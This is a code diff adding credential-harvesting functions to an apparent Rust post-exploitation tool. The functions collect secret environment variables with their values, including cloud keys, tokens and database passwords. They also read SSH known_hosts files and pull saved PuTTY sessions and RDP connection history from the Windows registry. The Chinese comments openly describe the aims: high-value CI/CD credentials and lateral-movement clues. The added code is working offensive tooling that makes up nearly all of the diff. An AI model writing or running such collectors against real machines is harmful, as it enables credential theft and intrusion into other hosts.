@@ -165,6 +165,172 @@ impl CredentialCollector {
         keys
     }
 
+    /// 收集环境变量中的敏感凭据（云密钥、数据库密码、token 等）
+    ///
+    /// 扫描当前进程环境变量，匹配常见密钥名。这类凭据常驻留在 CI/CD 容器、
+    /// 云函数、应用进程中，实战价值高。结果以 Token 形式返回（与文件令牌合并统计）。
+    pub fn collect_env_secrets(&self) -> Vec<Token> {
+        // 常见敏感环境变量名（大小写不敏感的子串匹配）
+        const SECRET_PATTERNS: &[&str] = &[
+            "AWS_SECRET_ACCESS_KEY",
+            "AWS_ACCESS_KEY_ID",
+            "AZURE_CLIENT_SECRET",
+            "AZURE_STORAGE_KEY",
+            "GOOGLE_APPLICATION_CREDENTIALS",
+            "GCP_SERVICE_ACCOUNT",
+            "GITHUB_TOKEN",
+            "GH_TOKEN",
+            "GITLAB_TOKEN",
+            "DATABASE_URL",
+            "DB_PASSWORD",
+            "MYSQL_PASSWORD",
+            "POSTGRES_PASSWORD",
+            "REDIS_PASSWORD",
+            "MONGO_PASSWORD",
+            "PRIVATE_KEY",
+            "SECRET_KEY",
+            "ACCESS_TOKEN",
+            "NPM_TOKEN",
+            "DOCKER_PASSWORD",
+            "SLACK_TOKEN",
+        ];
+
+        let mut tokens = Vec::new();
+        for (key, value) in std::env::vars() {
+            if value.is_empty() {
+                continue;
+            }
+            let upper = key.to_uppercase();
+            if SECRET_PATTERNS.iter().any(|p| upper.contains(p)) {
+                tokens.push(Token {
+                    token_type: "ENV".to_string(),
+                    location: format!("env:{}", key),
+                    content: value,
+                });
+            }
+        }
+
+        tokens
+    }
+
+    /// 收集 SSH known_hosts（揭示操作者连接过的内网主机，是横向移动的重要线索）
+    pub fn collect_known_hosts(&self) -> Vec<KnownHost> {
+        let patterns = vec![
+            "/root/.ssh/known_hosts",
+            "/home/*/.ssh/known_hosts",
+            "C:\\Users\\*\\.ssh\\known_hosts",
+        ];
+
+        let mut entries = Vec::new();
+        for pattern in patterns {
+            if let Ok(paths) = glob::glob(pattern) {
+                for path in paths.filter_map(|p| p.ok()) {
+                    if let Ok(content) = std::fs::read_to_string(&path) {
+                        let hosts: Vec<String> = content
+                            .lines()
+                            .filter_map(|line| {
+                                let line = line.trim();
+                                if line.is_empty() || line.starts_with('#') {
+                                    return None;
+                                }
+                                // known_hosts 格式: host[,host...] [keytype] key [comment]
+                                line.split_whitespace().next().map(|s| s.to_string())
+                            })
+                            .collect();
+                        if !hosts.is_empty() {
+                            entries.push(KnownHost {
+                                path: path.to_string_lossy().to_string(),
+                                hosts,
+                            });
+                        }
+                    }
+                }
+            }
+        }
+
+        entries
+    }
+
+    /// 收集 PuTTY 保存的会话（Windows 注册表）
+    ///
+    /// HKCU\Software\SimonTatham\PuTTY\Sessions\<name> 下的 HostName/UserName。
+    pub fn collect_putty_sessions(&self) -> Vec<RemoteSession> {
+        #[cfg(windows)]
+        {
+            use winreg::enums::*;
+            use winreg::RegKey;
+
+            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+            let mut sessions = Vec::new();
+            if let Ok(sess_root) =
+                hkcu.open_subkey_with_flags("Software\\SimonTatham\\PuTTY\\Sessions", KEY_READ)
+            {
+                for name in sess_root.enum_keys().filter_map(|k| k.ok()) {
+                    if let Ok(sess) = sess_root.open_subkey_with_flags(&name, KEY_READ) {
+                        let host: String = sess.get_value("HostName").unwrap_or_default();
+                        let username: String = sess.get_value("UserName").unwrap_or_default();
+                        if !host.is_empty() {
+                            sessions.push(RemoteSession {
+                                source: "PuTTY".to_string(),
+                                host,
+                                username: if username.is_empty() {
+                                    None
+                                } else {
+                                    Some(username)
+                                },
+                            });
+                        }
+                    }
+                }
+            }
+            sessions
+        }
+        #[cfg(not(windows))]
+        {
+            Vec::new()
+        }
+    }
+
+    /// 收集 RDP 连接历史（Windows 注册表）
+    ///
+    /// HKCU\Software\Microsoft\Terminal Server Client\Servers\<host> 的 UsernameHint。
+    pub fn collect_rdp_history(&self) -> Vec<RemoteSession> {
+        #[cfg(windows)]
+        {
+            use winreg::enums::*;
+            use winreg::RegKey;
+
+            let hkcu = RegKey::predef(HKEY_CURRENT_USER);
+            let mut sessions = Vec::new();
+            if let Ok(servers_root) = hkcu
+                .open_subkey_with_flags(
+                    "Software\\Microsoft\\Terminal Server Client\\Servers",
+                    KEY_READ,
+                )
+            {
+                for host in servers_root.enum_keys().filter_map(|k| k.ok()) {
+                    if let Ok(server) = servers_root.open_subkey_with_flags(&host, KEY_READ) {
+                        let username: String = server.get_value("UsernameHint").unwrap_or_default();
+                        sessions.push(RemoteSession {
+                            source: "RDP".to_string(),
+                            host,
+                            username: if username.is_empty() {
+                                None
+                            } else {
+                                Some(username)
+                            },
+                        });
+                    }
+                }
+            }
+            sessions
+        }
+        #[cfg(not(windows))]
+        {
+            Vec::new()
+        }
+    }
+
     /// Windows: 收集 Windows 密码哈希
     #[cfg(windows)]
     fn collect_windows_hashes(&self) -> Vec<HashEntry> {
@@ -549,6 +715,26 @@ pub struct ApiKey {
     /// 实际提取到的密钥值（如果成功提取）
     #[serde(default)]
     pub key_value: Option<String>,
+}
+
+/// SSH known_hosts 条目（揭示操作者连接过的主机，横向移动线索）
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct KnownHost {
+    /// known_hosts 文件路径
+    pub path: String,
+    /// 连接过的主机列表（每行第一个字段，可能含逗号分隔的多个主机/IP）
+    pub hosts: Vec<String>,
+}
+
+/// 远程连接历史（PuTTY session / RDP 历史）
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct RemoteSession {
+    /// 来源："PuTTY" / "RDP"
+    pub source: String,
+    /// 主机地址
+    pub host: String,
+    /// 用户名（如有）
+    pub username: Option<String>,
 }
 
 #[cfg(test)]
